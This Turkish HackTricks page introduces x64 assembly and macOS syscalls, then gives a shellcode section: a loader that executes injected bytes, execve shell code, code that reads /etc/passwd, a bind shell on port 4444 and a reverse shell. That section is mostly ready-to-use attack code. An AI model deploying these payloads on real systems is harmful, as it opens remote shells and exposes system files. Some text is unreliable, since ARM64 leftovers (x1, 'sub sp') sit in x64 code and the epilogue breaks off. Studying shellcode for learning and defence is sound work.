# x64 Giriş

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** katkıda bulunun.

</details>

## **x64 Giriş**

x64, masaüstü ve sunucu bilgisayarlarında yaygın olarak kullanılan 64-bit bir işlemci mimarisidir. Intel tarafından üretilen x86 mimarisinden türeyen ve daha sonra AMD tarafından AMD64 adıyla benimsenen x64, bugün kişisel bilgisayarlarda ve sunucularda yaygın olarak kullanılan bir mimaridir.

### **Kayıtlar**

x64, x86 mimarisini genişleterek `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` ve `r8` ile `r15` olarak adlandırılan **16 genel amaçlı kayda** sahiptir. Her biri bir **64-bit** (8-byte) değer saklayabilir. Bu kayıtlar ayrıca uyumluluk ve belirli görevler için 32-bit, 16-bit ve 8-bit alt kayıtlara sahiptir.

1. **`rax`** - Genellikle işlevlerden **dönüş değerleri** için kullanılır.
2. **`rbx`** - Bellek işlemleri için bir **temel kayıt** olarak sıkça kullanılır.
3. **`rcx`** - Genellikle **döngü sayaçları** için kullanılır.
4. **`rdx`** - Genişletilmiş aritmetik işlemler de dahil olmak üzere çeşitli rollerde kullanılır.
5. **`rbp`** - Yığın çerçevesi için **temel işaretçi**.
6. **`rsp`** - Yığının üstünü takip eden **yığın işaretçisi**.
7. **`rsi`** ve **`rdi`** - Dize/bellek işlemlerinde **kaynak** ve **hedef** dizinleri için kullanılır.
8. **`r8`** ile **`r15`** - x64'te tanıtılan ek genel amaçlı kayıtlar.

### **Çağrı Sözleşmesi**

x64 çağrı sözleşmesi işletim sistemlerine göre değişir. Örneğin:

* **Windows**: İlk **dört parametre**, **`rcx`**, **`rdx`**, **`r8`** ve **`r9`** kayıtlarında iletilir. Daha fazla parametre yığına itilir. Dönüş değeri **`rax`** içerisindedir.
* **System V (UNIX benzeri sistemlerde yaygın olarak kullanılır)**: İlk **altı tamsayı veya işaretçi parametre**, **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** ve **`r9`** kayıtlarında iletilir. Dönüş değeri de **`rax`** içerisindedir.

Eğer fonksiyonun altıdan fazla girişi varsa, **geri kalanlar yığına iletilir**. **RSP**, yığın işaretçisi, herhangi bir çağrıdan önce bölünebilir olması gereken **16 byte hizalanmış** olmalıdır. Bu, normalde bir işlev çağrısı yapmadan önce RSP'nin düzgün hizalandığından emin olmamız gerektiği anlamına gelir. Ancak pratikte, sistem çağrıları bu gereksinimi karşılamasa bile birçok kez çalışır.

### Swift'te Çağrı Sözleşmesi

Swift'in kendi **çağrı sözleşmesi**, [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) adresinde bulunabilir.

### **Yaygın Komutlar**

x64 komutları, önceki x86 komutlarıyla uyumluluğu koruyan ve yeni komutlar tanıtan zengin bir sete sahiptir.

* **`mov`**: Bir **kaydı** veya **bellek konumunu** başka bir yere **taşır**.
* Örnek: `mov rax, rbx` — `rbx` içindeki değeri `rax`'a taşır.
* **`push`** ve **`pop`**: Değerleri **yığın**a itme veya yığından çekme.
* Örnek: `push rax` — `rax` içindeki değeri yığına iter.
* Örnek: `pop rax` — Yığının üstündeki değeri `rax` içine çeker.
* **`add`** ve **`sub`**: **Toplama** ve **çıkarma** işlemleri.
* Örnek: `add rax, rcx` — `rax` ve `rcx` içindeki değerleri toplayarak sonucu `rax` içine kaydeder.
* **`mul`** ve **`div`**: **Çarpma** ve **bölme** işlemleri. Not: Bu işlemler, işlem yapılacak operandlara bağlı olarak belirli davranışlara sahiptir.
* **`call`** ve **`ret`**: İşlevleri **çağırmak** ve **geri dönmek** için kullanılır.
* **`int`**: Yazılım tabanlı bir **kesmeyi tetiklemek** için kullanılır. Örneğin, 32-bit x86 Linux'ta sistem çağrıları için `int 0x80` kullanılırdı.
* **`cmp`**: İki değeri karşılaştırır ve CPU bayraklarını sonuca göre ayarlar.
* Örnek: `cmp rax, rdx` — `rax`'ı `rdx` ile karşılaştırır.
* **`je`, `jne`, `jl`, `jge`, ...**: Önceki bir `cmp` veya testin sonuçlarına dayanarak kontrol akışını değiştiren **koşullu atlama** komutları.
* Örnek: `cmp rax, rdx` talimatından sonra, `je label` — `rax`, `rdx`'e eşitse `label`'a atlar.
* **`syscall`**: Bazı x64 sistemlerinde (modern Unix gibi) **sistem çağrıları** için kullanılır.
* **`sysenter`**: Bazı platformlarda optimize edilmiş bir **sistem çağrısı** talimatı.

### **Fonksiyon Prologu**

1. **Eski temel işaretçiyi yığına it**: `push rbp` (çağırıcının temel işaretçisini kaydeder)
2. **Geçerli yığın işaretçisini temel işaretçiye taşı**: `mov rbp, rsp` (geçerli işlev için yeni temel işaretçiyi ayarlar)
3. **Yerel değişkenler için yığında yer ayır**: `sub rsp, <boyut>` (<boyut>, ihtiyaç duyulan bayt sayısıdır)

### **Fonksiyon Epilogu**

1. **Geçerli temel işaretçiyi yığın işaretçisine taşı**: `mov rsp, rbp` (yerel değişkenleri serbest bırakır)
2. **Eski temel işaretçisini yığından çek**: `pop rbp` (çağırıcının temel işaretçisini geri yükler)
3. **Dön**:
## macOS

### sistem çağrıları

Farklı sistem çağrısı sınıfları bulunmaktadır, [**burada bulabilirsiniz**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Ardından, her sistem çağrısı numarasını [**bu URL'de**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** bulabilirsiniz:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Böylece **Unix/BSD sınıfından** `open` sistem çağrısını (**5**) çağırmak için eklemeniz gereken şey: `0x2000000`

Bu durumda, open çağırmak için sistem çağrısı numarası `0x2000005` olacaktır.

### Shellcode'lar

Derlemek için:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Baytları çıkarmak için:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Shellcode'ı test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**Buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.

{% tabs %}
{% tab title="adr ile" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% tab title="yığınla birlikte" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### cat ile oku

Amaç, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu nedenle ikinci argüman (x1), parametrelerin bir dizisi (bellekte bir adres yığını anlamına gelir) olmalıdır.
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh ile komut çağırma

Bir komutu `sh` ile çağırmak için aşağıdaki adımları izleyebilirsiniz:

```bash
sh -c 'komut'
```

Bu komut, `sh` kabuğunu kullanarak belirtilen komutu çalıştıracaktır. `'komut'` kısmını, çağırmak istediğiniz komutun yerine geçecek şekilde değiştirmeniz gerekmektedir.
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bağlama kabuğu

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) adresindeki bağlama kabuğu **4444 numaralı port** üzerinden.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Ters Kabuk

Ters kabuk [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) adresinden alınabilir. Ters kabuk **127.0.0.1:4444** adresine gönderilir.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
